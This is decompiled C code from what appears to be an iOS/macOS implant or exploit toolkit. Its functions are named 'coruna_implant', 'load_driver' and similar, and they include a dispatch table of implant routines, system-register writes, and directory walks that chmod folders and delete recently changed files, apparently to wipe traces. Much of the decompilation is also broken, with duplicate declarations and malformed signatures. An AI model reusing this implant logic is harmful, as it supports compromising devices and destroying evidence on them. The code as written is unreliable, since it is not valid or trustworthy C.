  *(uint *)(handle + 0x50) = size;
  _bzero(ptr,(unsigned long)size);
  if (*(void (**)(handle + 0x120) != (void (*)0x0) {
    (**(void (**)(handle + 0x120))
              (handle,*(uint64_t *)(handle + 0x48),*(uint32_t *)(handle + 0x50));
  }
  return 0;
}





long coruna_surface_dispatch_thunk(long handle,unsigned long arg)
{
  long handle;
  
  if (*(uint *)(handle + 0x50) < arg) {
    handle = 0;
  }
  else {
    handle = *(long *)(handle + 0x48);
    *(unsigned long *)(handle + 0x48) = handle + arg;
    *(uint *)(handle + 0x50) = *(uint *)(handle + 0x50) - (int)arg;
  }
  return handle;
}





uint64_t coruna_bzero(uint64_t val,void *ctx,size_t len)
{
  if ((ctx != (void *)0x0) && (len != 0)) {
    _bzero(ctx,len);
  }
  return 0;
}





uint64_t coruna_bzero_10254(uint64_t val,void *ctx,size_t len)
{
  _bzero(ctx,len);
  return 0;
}





uint coruna_chmod_dir_walk(char *path,char *str_2,char *name_3,uint size)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  time_t lt5;
  int *err;
  long handle;
  size_t ls8;
  long addr;
  size_t ls10;
  uint *ptr;
  uint size;
  char scratch [1024];
  stat bootargs;
  
  bootargs.st_gen = 0;
  bootargs.st_lspare = 0;
  bootargs.st_blksize = 0;
  bootargs.st_flags = 0;
  bootargs.st_qspare[1] = 0;
  bootargs.st_qspare[0] = 0;
  bootargs.st_birthtimespec.tv_nsec = 0;
  bootargs.st_birthtimespec.tv_sec = 0;
  bootargs.st_blocks = 0;
  bootargs.st_size = 0;
  bootargs.st_mtimespec.tv_nsec = 0;
  bootargs.st_mtimespec.tv_sec = 0;
  bootargs.st_ctimespec.tv_nsec = 0;
  bootargs.st_ctimespec.tv_sec = 0;
  bootargs.st_rdev = 0;
  bootargs = 0;
  bootargs.st_uid = 0;
  bootargs.st_gid = 0;
  bootargs.st_atimespec.tv_nsec = 0;
  bootargs.st_atimespec.tv_sec = 0;
  bootargs.st_ino = 0;
  bootargs.st_dev = 0;
  bootargs.st_mode = 0;
  bootargs.st_nlink = 0;
  _bzero(scratch,0x400);
  lt5 = _time((time_t *)0x0);
  size = 0xad001;
  if ((path != (char *)0x0) && (*path != '\0')) {
    err = _lstat(path,&bootargs);
    if (err == 0) {
      size = 0xad00b;
      if ((bootargs.st_mode & 0xf000) == 0x4000) {
        _chmod(path,0x1ed);
        bootargs.st_ino = 0;
        bootargs.st_dev = 0;
        bootargs.st_mode = 0;
        bootargs.st_nlink = 0;
        bootargs.st_rdev = 0;
        bootargs = 0;
        bootargs.st_uid = 0;
        bootargs.st_gid = 0;
        bootargs.st_atimespec.tv_nsec = 0;
        bootargs.st_atimespec.tv_sec = 0;
        bootargs.st_mtimespec.tv_nsec = 0;
        bootargs.st_mtimespec.tv_sec = 0;
        bootargs.st_ctimespec.tv_nsec = 0;
        bootargs.st_ctimespec.tv_sec = 0;
        bootargs.st_birthtimespec.tv_nsec = 0;
        bootargs.st_birthtimespec.tv_sec = 0;
        bootargs.st_blocks = 0;
        bootargs.st_size = 0;
        bootargs.st_gen = 0;
        bootargs.st_lspare = 0;
        bootargs.st_blksize = 0;
        bootargs.st_flags = 0;
        bootargs.st_qspare[1] = 0;
        bootargs.st_qspare[0] = 0;
        handle = _opendir(path);
        if (handle != 0) {
          ls8 = _strlen(path);
          buf = "%s%s";
          if (path[ls8 - 1] != '/') {
            buf = "%s/%s";
          }
          err = ___error();
          *err = 0;
          addr = _readdir(handle);
          if (addr == 0) {
            size = 0;
          }
          else {
            size = 0;
            do {
              ptr = (char *)(addr + 0x15);
              err = _strcmp(ptr,"..");
              u = size;
              if ((err != 0) && (err = _strcmp(ptr,"."), err != 0)) {
                u = _snprintf(scratch,0x400,buf);
                if (u == 0xffffffff) {
                  err = ___error();
                  err = *err;
                  ptr = (uint *)___error();
                  u = -*ptr;
                  if (-1 < err) {
                    u = *ptr;
                  }
                  u = u | 0x40000000;
                }
                else if (u < 0x400) {
                  err = _lstat(scratch,&bootargs);
                  u = 0xad00b;
                  if (err == 0) {
                    if ((bootargs.st_mode & 0xf000) == 0x4000) {
                      u = 0;
                      if ((*ptr != '\0') && (*ptr != '.')) {
                        u = coruna_chmod_dir_walk(scratch,str_2,name_3,size);
                      }
                    }
                    else {
                      if (str_2 == (char *)0x0) {
fail:
                        if (name_3 != (char *)0x0) {
                          ls8 = _strlen(ptr);
                          ls10 = _strlen(name_3);
                          if ((ls8 < ls10) ||
                             (err = _strncmp((char *)(addr + (ls8 - ls10) + 0x15),name_3,
                                               ls10), err != 0)) goto done;
                        }
                        if ((size == 0) ||
                           ((lt5 <= bootargs.st_ctimespec.tv_sec ||
                            (lt5 - bootargs.st_ctimespec.tv_sec <= (long)(unsigned long)size)))) {
                          u = 0xad001;
                          if (scratch[0] != '\0') {
                            err = _unlink(scratch);
                            if ((err == 0) || (err = ___error(), *err == 2))
                            goto done;
                            err = ___error();
                            err = *err;
                            ptr = (uint *)___error();
                            u = -*ptr;
                            if (-1 < err) {
                              u = *ptr;
                            }
                            u = u | 0x40000000;
                          }
                          goto cleanup;
                        }
                      }
                      else {
                        ls8 = _strlen(ptr);
                        ls10 = _strlen(str_2);
                        if ((ls10 <= ls8) &&
                           (err = _strncmp(ptr,str_2,ls10), err == 0)) goto fail;
                      }
done:
                      u = 0;
                    }
                  }
cleanup:
                  bootargs.st_gen = 0;
                  bootargs.st_lspare = 0;
                  bootargs.st_blksize = 0;
                  bootargs.st_flags = 0;
                  bootargs.st_qspare[1] = 0;
                  bootargs.st_qspare[0] = 0;
                  bootargs.st_birthtimespec.tv_nsec = 0;
                  bootargs.st_birthtimespec.tv_sec = 0;
                  bootargs.st_blocks = 0;
                  bootargs.st_size = 0;
                  bootargs.st_mtimespec.tv_nsec = 0;
                  bootargs.st_mtimespec.tv_sec = 0;
                  bootargs.st_ctimespec.tv_nsec = 0;
                  bootargs.st_ctimespec.tv_sec = 0;
                  bootargs.st_rdev = 0;
                  bootargs = 0;
                  bootargs.st_uid = 0;
                  bootargs.st_gid = 0;
                  bootargs.st_atimespec.tv_nsec = 0;
                  bootargs.st_atimespec.tv_sec = 0;
                  bootargs.st_ino = 0;
                  bootargs.st_dev = 0;
                  bootargs.st_mode = 0;
                  bootargs.st_nlink = 0;
                }
                else {
                  u = 0xad00c;
                }
                _bzero(scratch,0x400);
                if (size != 0) {
                  u = size;
                }
              }
              size = u;
              err = ___error();
              *err = 0;
              addr = _readdir(handle);
            } while (addr != 0);
          }
          err = ___error();
          if (*err != 0) {
            err = ___error();
            err = *err;
            ptr = (uint *)___error();
            size = -*ptr;
            if (-1 < err) {
              size = *ptr;
            }
            size = size | 0x40000000;
          }
          err = _closedir(handle);
          if (err != 0) {
            size = 0xad00b;
          }
        }
      }
    }
    else {
      err = ___error();
      if (*err == 2) {
        size = 0;
      }
      else {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        size = -*ptr;
        if (-1 < err) {
          size = *ptr;
        }
        size = size | 0x40000000;
      }
    }
  }
  return size;
}





uint64_t coruna_unlink_recent_in_dir(char *path,uint size)
{
  size_t ls1;
  char err;
  int err;
  time_t lt4;
  long handle;
  size_t ls6;
  long addr;
  char *ptr;
  size_t ls9;
  char *buf;
  uint64_t u;
  stat scratch;
  
  u = 0xad001;
  lt4 = _time((time_t *)0x0);
  if ((path != (char *)0x0) && (*path != '\0' && size != 0)) {
    handle = _opendir(path);
    if (handle == 0) {
      u = 0xad00b;
    }
    else {
      ls6 = _strlen(path);
      err = path[ls6 - 1];
      ls1 = ls6;
      if (err != '/') {
        ls1 = ls6 + 1;
      }
      addr = _readdir(handle);
      if (addr != 0) {
        do {
          if (*(char *)(addr + 0x14) == '\b') {
            ptr = _calloc(ls1 + 1 + (unsigned long)*(ushort *)(addr + 0x12),1);
            if (ptr == (char *)0x0) {
              _readdir(handle);
              u = 0xad009;
              goto fail;
            }
            scratch.st_gen = 0;
            scratch.st_lspare = 0;
            scratch.st_blksize = 0;
            scratch.st_flags = 0;
            scratch.st_qspare[1] = 0;
            scratch.st_qspare[0] = 0;
            scratch.st_birthtimespec.tv_nsec = 0;
            scratch.st_birthtimespec.tv_sec = 0;
            scratch.st_blocks = 0;
            scratch.st_size = 0;
            scratch.st_mtimespec.tv_nsec = 0;
            scratch.st_mtimespec.tv_sec = 0;
            scratch.st_ctimespec.tv_nsec = 0;
            scratch.st_ctimespec.tv_sec = 0;
            scratch.st_rdev = 0;
            scratch = 0;
            scratch.st_uid = 0;
            scratch.st_gid = 0;
            scratch.st_atimespec.tv_nsec = 0;
            scratch.st_atimespec.tv_sec = 0;
            scratch.st_ino = 0;
            scratch.st_dev = 0;
            scratch.st_mode = 0;
            scratch.st_nlink = 0;
            _strncpy(ptr,path,ls6);
            if (err != '/') {
              ls9 = _strlen(ptr);
              (ptr + ls9)[0] = '/';
              (ptr + ls9)[1] = '\0';
            }
            buf = _strcat(ptr,(char *)(addr + 0x15));
            err = _stat(buf,&scratch);
            if ((err == 0) &&
               ((lt4 <= scratch.st_ctimespec.tv_sec ||
                (lt4 - scratch.st_ctimespec.tv_sec <= (long)(unsigned long)size)))) {
              _unlink(ptr);
            }
            ls9 = _strlen(ptr);
            _bzero(ptr,ls9);
            _free(ptr);
          }
          addr = _readdir(handle);
        } while (addr != 0);
      }
      u = 0;
fail:
      _closedir(handle);
    }
  }
  return u;
}





unsigned long coruna_load_driver(long *arg,long val,uint64_t n,uint64_t *m)

{
  long *data;
  uint size;
  uint type_id;
  unsigned long version;
  char *str;
  size_t ls6;
  short *lps7;
  unsigned long type_id_11;
  uint64_t kind;
  long *obj;
  uint64_t *region;
  long plist;
  void (*cache_37)(void);
  uint32_t cache_38;
  long cache_39;
  
  region = (uint64_t *)0x0;
  plist = 0;
  type_id_11 = 0xad001;
  if ((arg == (long *)0x0) || (val == 0)) {
    return 0xad001;
  }
  version = coruna_implant_residual_45(&plist,&region);
  if ((int)version != 0) {
    return version;
  }
  version = coruna_implant08_via_ctx_free_5(region,val);
  coruna_ctx_free_10f08(plist);
  return version;
}





uint64_t coruna_implant_residual_45(uint64_t *val,uint64_t *id_2)
{
  uint64_t u;
  uint32_t *ptr;
  void *ptr;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && (id_2 != (uint64_t *)0x0)) {
    ptr = _calloc(1,0x140);
    if (ptr != (uint32_t *)0x0) {
      ptr = _calloc(1,0x50);
      if (ptr != (void *)0x0) {
        *ptr = 0x60004;
        *(void **)(ptr + 2) = ptr;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_implant_via_run_starti;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_implant_via_run_starti_2;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_implant_residual_47;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_chdir_tmp;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_implant_via_run_starti_3;
        ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_implant_via_run_starti_4;
        ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_implant_via_run_starti_5;
        ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_implant_via_run_starti_6;
        ((void (**)(void *, long, uint64_t))(ptr + 0x14))[0] = coruna_implant_residual_48;
        ((void (**)(void *, long, uint64_t))(ptr + 0x16))[0] = coruna_implant_residual_49;
        ((void (**)(void *, long, uint64_t))(ptr + 0x18))[0] = coruna_driver_copy_port_1918;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1a))[0] = coruna_implant_residual_50;
        ((void (**)(void *, long, uint64_t))(ptr + 0x38))[0] = coruna_driver_copy_port_1918;
        ((void (**)(void *, long, uint64_t))(ptr + 0x48))[0] = coruna_implant_residual_51;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1c))[0] = coruna_implant_residual_52;
        ((void (**)(void *, long, uint64_t))(ptr + 0x1e))[0] = coruna_implant_residual_53;
        ((void (**)(void *, long, uint64_t))(ptr + 0x20))[0] = coruna_implant_residual_54;
        ((void (**)(void *, long, uint64_t))(ptr + 0x22))[0] = coruna_implant_residual_55;
        *(uint8_t **)(ptr + 0x24) = &k_implant_rodata_word_11fc8;
        *(uint8_t **)(ptr + 0x26) = &k_implant_rodata_word_12014;
        ((void (**)(void *, long, uint64_t))(ptr + 0x46))[0] = coruna_implant_via_macho_iface_create;
        ((void (**)(void *, long, uint64_t))(ptr + 0x28))[0] = coruna_parse_xnu_release;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2a))[0] = coruna_strncpy;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2c))[0] = coruna_bzero_122f8;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4a))[0] = coruna_strncpy_2;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4c))[0] = coruna_bzero_1241c;
        ((void (**)(void *, long, uint64_t))(ptr + 0x2e))[0] = coruna_implant_residual_56;
        ((void (**)(void *, long, uint64_t))(ptr + 0x30))[0] = coruna_implant_residual_57;
        ((void (**)(void *, long, uint64_t))(ptr + 0x32))[0] = coruna_run_startm;
        ((void (**)(void *, long, uint64_t))(ptr + 0x34))[0] = coruna_csops_12674;
        ((void (**)(void *, long, uint64_t))(ptr + 0x36))[0] = coruna_implant_via_check_softwareupdate;
        ((void (**)(void *, long, uint64_t))(ptr + 0x44))[0] = coruna_implant_via_host_get_special_port;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3a))[0] = coruna_implant_residual_58;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3c))[0] = coruna_implant_residual_59;
        ((void (**)(void *, long, uint64_t))(ptr + 0x3e))[0] = coruna_implant_residual_60;
        ((void (**)(void *, long, uint64_t))(ptr + 0x40))[0] = coruna_driver_copy_port_1918;
        ((void (**)(void *, long, uint64_t))(ptr + 0x42))[0] = coruna_implant_residual_61;
        ((void (**)(void *, long, uint64_t))(ptr + 0x4e))[0] = coruna_implant_residual_62;
        *val = ptr;
        *id_2 = ptr;
        return 0;
      }
      _free(ptr);
    }
    u = 0xad009;
  }
  return u;
}





unsigned long coruna_dlopen_rpath(long arg,long val)

{
  uint u;
  unsigned long size;
  long serial;
  
  size = 0xad001;
  if (((arg != 0) && (serial = *(long *)(arg + 8), serial != 0 && val != 0)) &&
     (*(long *)(val + 0x130) != 0)) {
    if (*(long *)(serial + 0x18) == 0) {
      size = 0;
    }
    else {
      size = (**(void (**)(*(long *)(serial + 0x18) + 0x10))();
      *(uint64_t *)(serial + 0x18) = 0;
    }
    if (*(long *)(serial + 0x10) != 0) {
      u = (**(void (**)(val + 0x130))(val);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
      *(uint64_t *)(serial + 0x10) = 0;
    }
  }
  return size;
}





uint64_t coruna_ctx_free_10f08(uint64_t *val)
{
  size_t ls1;
  uint64_t *ptr;
  char *ptr;
  
  if (val != (uint64_t *)0x0) {
    ptr = (uint64_t *)val[1];
    if (ptr != (uint64_t *)0x0) {
      ptr = (char *)ptr[7];
      if (ptr != (char *)0x0) {
        ls1 = _strlen(ptr);
        _bzero(ptr,ls1);
        _free((void *)ptr[7]);
      }
      ptr = (char *)ptr[9];
      if (ptr != (char *)0x0) {
        ls1 = _strlen(ptr);
        _bzero(ptr,ls1);
        _free((void *)ptr[9]);
      }
      ptr[7] = 0;
      ptr[6] = 0;
      ptr[9] = 0;
      ptr[8] = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      ptr[5] = 0;
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      _free(ptr);
    }
    val[0x25] = 0;
    val[0x24] = 0;
    val[0x27] = 0;
    val[0x26] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





int coruna_implant_via_dlopen_rpath(long handle,long addr_2)
{
  int err;
  int status;
  uint64_t *ptr;
  
  status = 0xad001;
  if ((handle != 0) &&
     (ptr = *(uint64_t **)(handle + 8), ptr != (uint64_t *)0x0 && addr_2 != 0)) {
    err = coruna_implant_residual_46(handle);
    status = (**(void (**)(ptr[1] + 0x20))();
    if (err != 0) {
      status = err;
    }
    if (ptr[4] != 0) {
      err = (**(void (**)(ptr[3] + 0x30))();
      if (status != 0) {
        err = status;
      }
      status = (**(void (**)(ptr[3] + 0x20))(ptr[3],ptr[4]);
      if (err != 0) {
        status = err;
      }
    }
    err = coruna_dlopen_rpath(handle,addr_2);
    if (status != 0) {
      err = status;
    }
    status = (**(void (**)(ptr[1] + 0x10))();
    if (err != 0) {
      status = err;
    }
    err = coruna_ctx_free(*ptr);
    if (status != 0) {
      err = status;
    }
    status = coruna_ctx_free_10f08(handle);
    if (err != 0) {
      status = err;
    }
  }
  return status;
}





unsigned long coruna_implant_residual_46(long arg)

{
  uint u;
  unsigned long size;
  long serial;
  
  size = 0xad001;
  if ((arg != 0) && (serial = *(long *)(arg + 8), serial != 0)) {
    if (*(long *)(serial + 0x30) == 0) {
      size = 0;
    }
    else {
      size = (**(void (**)(*(long *)(serial + 0x30) + 0x10))();
      *(uint64_t *)(serial + 0x30) = 0;
    }
    if (*(long *)(serial + 0x28) != 0) {
      u = (**(void (**)(arg + 0x60))(arg);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
      *(uint64_t *)(serial + 0x28) = 0;
    }
  }
  return size;
}





uint64_t
uint64_t coruna_strdup(uint64_t *val,short *arg,short *arg,short *val,char *path, char *str_2)
{
  uint64_t *ptr;
  char *ptr;
  uint64_t u;
  uint64_t *scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  if ((((((val != (uint64_t *)0x0) && (arg != (short *)0x0)) && (*arg == 1)) &&
       ((arg[1] != 0 && (arg != (short *)0x0)))) &&
      ((*arg == 2 && ((1 < (ushort)arg[1] && (val != (short *)0x0)))))) &&
     ((*val == 3 && (val[1] != 0)))) {
    scratch = (uint64_t *)0x0;
    bootargs = 0;
    u = coruna_implant_residual_45(&bootargs,&scratch);
    ptr = scratch;
    if ((int)u == 0) {
      *scratch = arg;
      scratch[1] = val;
      scratch[3] = arg;
      if (path != (char *)0x0) {
        ptr = _strdup(path);
        ptr[7] = ptr;
      }
      if (str_2 != (char *)0x0) {
        ptr = _strdup(str_2);
        ptr[9] = ptr;
      }
      *val = bootargs;
    }
  }
  return u;
}





int coruna_implant_via_ctx_free_10f08(long handle)
{
  int err;
  int status;
  long handle;
  long addr;
  
  status = 0xad001;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    err = coruna_implant_residual_46(handle);
    handle = *(long *)(addr + 0x18);
    if ((handle != 0) &&
       (((*(void (**)(handle + 0x30) != (void (*)0x0 && (*(long *)(handle + 0x20) != 0)) &&
        (*(long *)(addr + 0x20) != 0)))) {
      status = (**(void (**)(handle + 0x30))();
      if (err != 0) {
        status = err;
      }
      err = (**(void (**)(*(long *)(addr + 0x18) + 0x20))
                        (*(long *)(addr + 0x18),*(uint64_t *)(addr + 0x20));
      if (status != 0) {
        err = status;
      }
    }
    status = coruna_ctx_free_10f08(handle);
    if (err != 0) {
      status = err;
    }
  }
  return status;
}





unsigned long coruna_bzero_3(uint64_t *arg,short *val,long n,uint64_t m,char *p,
                  char *q)

{
  uint u;
  uint size;
  int flags;
  unsigned long version;
  char *str;
  size_t ls6;
  uint64_t tag;
  char cache_40 [3];
  uint tmp_buf;
  uint8_t region[8];
  uint64_t *plist;
  uint64_t cache_37;
  
  if (arg == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (val == (short *)0x0) {
    return 0xad001;
  }
  if (*val != 2) {
    return 0xad001;
  }
  if (((ushort)val[1] < 2 || n == 0) || (int)m == 0) {
    return 0xad001;
  }
  plist = (uint64_t *)0x0;
  cache_37 = 0;
  version = coruna_implant_residual_45(&cache_37,&plist);
  if ((int)version != 0) {
    return version;
  }
  plist[3] = val;
  version = coruna_implant08_via_ctx_free_4(plist,n,m);
  coruna_ctx_free_10f08(cache_37);
  return version;
}





int coruna_find_objc_methlist(long handle)
{
  int err;
  int status;
  int flags;
  uint64_t *ptr;
  
  status = 0xad001;
  if ((handle != 0) && (ptr = *(uint64_t **)(handle + 8), ptr != (uint64_t *)0x0)) {
    err = coruna_implant_residual_46(handle);
    status = (**(void (**)(ptr[1] + 0x20))();
    if (err != 0) {
      status = err;
    }
    if (ptr[4] != 0) {
      err = (**(void (**)(ptr[3] + 0x30))();
      if (status != 0) {
        err = status;
      }
      status = (**(void (**)(ptr[3] + 0x20))(ptr[3],ptr[4]);
      if (err != 0) {
        status = err;
      }
    }
    err = (**(void (**)(ptr[1] + 0x10))();
    if (status != 0) {
      err = status;
    }
    flags = coruna_ctx_free(*ptr);
    if (err != 0) {
      flags = err;
    }
    status = coruna_ctx_free_10f08(handle);
    if (flags != 0) {
      status = flags;
    }
  }
  return status;
}





uint64_t coruna_implant_via_run_starti(long handle,long addr_2)
{
  void (*ptr)(void);
  uint64_t u;
  long handle;
  long addr;
  unsigned long unaff_x30;
  
  if ((handle == 0) || (addr = *(long *)(handle + 8), addr == 0 || addr_2 == 0)) {
    return 0xad001;
  }
  if (*(char *)(addr + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  handle = *(long *)(addr + 0x30);
  if (handle == 0) {
    u = coruna_run_starti();
    if ((int)u != 0) {
      return u;
    }
    handle = *(long *)(addr + 0x30);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = (**(void (**)(handle + 0x38))(handle,addr_2);
    return u;
  }
    ___stack_chk_fail();
}





unsigned long coruna_implant_via_run_starti_2(long arg,uint64_t val,uint64_t n,int m)

{
  uint u;
  uint size;
  unsigned long type_id;
  long serial_7;
  long serial_8;
  int cache_41;
  
  type_id = 0xad001;
  if ((arg != 0) && (serial_8 = *(long *)(arg + 8), serial_8 != 0)) {
    if (*(char *)(serial_8 + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    serial_7 = *(long *)(serial_8 + 0x30);
    if (serial_7 == 0) {
      type_id = coruna_run_starti(arg);
      if ((int)type_id != 0) {
        return type_id;
      }
      serial_7 = *(long *)(serial_8 + 0x30);
    }
    cache_41 = 0;
    size = (**(void (**)(serial_7 + 0x38))(serial_7,&cache_41);
    u = size;
    if (size == 0 && cache_41 != 1) {
      u = 0xad005;
    }
    type_id = (unsigned long)u;
    if ((size == 0 && cache_41 != 1) && (m != 0)) {
      type_id = (**(void (**)(*(long *)(serial_8 + 0x30) + 0x40))();
    }
    if ((int)type_id == 0) {
      type_id = (**(void (**)(*(long *)(serial_8 + 0x30) + 0x28))(*(long *)(serial_8 + 0x30),val,n)
      ;
    }
  }
  return type_id;
}





uint64_t coruna_implant_residual_47(long handle,uint64_t val)
{
  uint64_t u;
  uint32_t scratch;
  uint64_t bootargs;
  
  u = 0xad001;
  bootargs = 0;
  scratch = 0;
  if ((handle != 0) && (*(long *)(handle + 8) != 0)) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(handle + 0x68))(handle,0x20000,&bootargs,&scratch);
    if ((int)u == 0) {
      u = (**(void (**)(handle + 0x18))(handle,bootargs,scratch,val);
    }
  }
  return u;
}





uint64_t coruna_chdir_tmp(long handle)
{
  char *ptr;
  long handle;
  uint64_t u;
  long addr;
  int scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti();
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x38))(handle,&scratch);
    if ((int)u == 0) {
      if (scratch == 2) {
        ptr = _getcwd((char *)0x0,0);
        _chdir("/tmp");
        u = (**(void (**)(*(long *)(addr + 0x30) + 0x30))();
        if (ptr != (char *)0x0) {
          _chdir(ptr);
          _free(ptr);
        }
      }
      else {
        u = 0xad002;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_via_run_starti_3(long handle)
{
  uint64_t u;
  long handle;
  long addr;
  int scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0)) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti(handle);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    u = (**(void (**)(handle + 0x38))(handle,&scratch);
    if ((int)u == 0 && scratch != 1) {
      u = (**(void (**)(*(long *)(addr + 0x30) + 0x40))();
    }
  }
  return u;
}





uint64_t coruna_implant_via_run_starti_4(long handle,long addr_2,long off_3,long ctx_4,long ctx_5)
{
  void (*ptr)(void);
  uint64_t u;
  long handle;
  long addr;
  unsigned long unaff_x30;
  
  if ((handle == 0) ||
     (addr = *(long *)(handle + 8),
     (((addr == 0 || addr_2 == 0) || off_3 == 0) || ctx_4 == 0) || ctx_5 == 0)) {
    return 0xad001;
  }
  if (*(char *)(addr + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  handle = *(long *)(addr + 0x30);
  if (handle == 0) {
    u = coruna_run_starti();
    if ((int)u != 0) {
      return u;
    }
    handle = *(long *)(addr + 0x30);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = (**(void (**)(handle + 0x20))(handle,addr_2,off_3,ctx_4,ctx_5);
    return u;
  }
    ___stack_chk_fail();
}





uint64_t coruna_implant_via_run_starti_5(long handle,long addr_2)
{
  void (*ptr)(void);
  uint64_t u;
  long handle;
  long addr;
  unsigned long unaff_x30;
  
  if ((handle == 0) || (addr = *(long *)(handle + 8), addr == 0 || addr_2 == 0)) {
    return 0xad001;
  }
  if (*(char *)(addr + 0x40) != '\0') {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
  }
  handle = *(long *)(addr + 0x30);
  if (handle == 0) {
    u = coruna_run_starti();
    if ((int)u != 0) {
      return u;
    }
    handle = *(long *)(addr + 0x30);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = (**(void (**)(handle + 0x18))(handle,addr_2);
    return u;
  }
    ___stack_chk_fail();
}





uint64_t coruna_implant_via_run_starti_6(long handle,uint32_t *size)
{
  uint64_t u;
  long handle;
  long addr;
  int scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr = *(long *)(handle + 8), addr != 0 && size != (uint32_t *)0x0)
     ) {
    if (*(char *)(addr + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    handle = *(long *)(addr + 0x30);
    if (handle == 0) {
      u = coruna_run_starti(handle);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(addr + 0x30);
    }
    scratch = 0;
    u = (**(void (**)(handle + 0x18))(handle,&scratch);
    if ((int)u == 0) {
      if (scratch - 7U < 2) {
        u = 0;
        *size = 2;
      }
      else {
        u = 0xad008;
      }
    }
  }
  return u;
}





uint64_t coruna_implant_residual_48(long handle,long addr_2,int flags,long off_3)
{
  uint64_t u;
  long handle;
  
  if ((handle != 0) &&
     (handle = *(long *)(handle + 8), ((handle != 0 && addr_2 != 0) && flags != 0) && off_3 != 0
     )) {
    if (*(char *)(handle + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
    }
    u = (**(void (**)(*(long *)(handle + 8) + 0x30))();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant_residual_49(long handle,long addr_2,char *path,long off_3)
{
  uint64_t u;
  coruna_implant_trampoline_fn indirect_target;
  
  if ((((handle != 0) && (*(long *)(handle + 8) != 0 && addr_2 != 0)) &&
      (indirect_target = *(void (**)(addr_2 + 0x30),
      indirect_target != (void (*)0x0 && path != (char *)0x0)) &&
     ((*path != '\0' && (off_3 != 0)))) {
    if (*(char *)(*(long *)(handle + 8) + 0x40) != '\0') {
      UnkSytemRegWrite(3,4,0xf,2,7,0);
      InstructionSynchronizationBarrier();
      indirect_target = *(void (**)(addr_2 + 0x30);
    }
    u = (*indirect_target)(addr_2,path,off_3);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_copy_port_1918(long handle,long addr_2)
{
  uint64_t u;
  coruna_implant_trampoline_fn indirect_target;
  
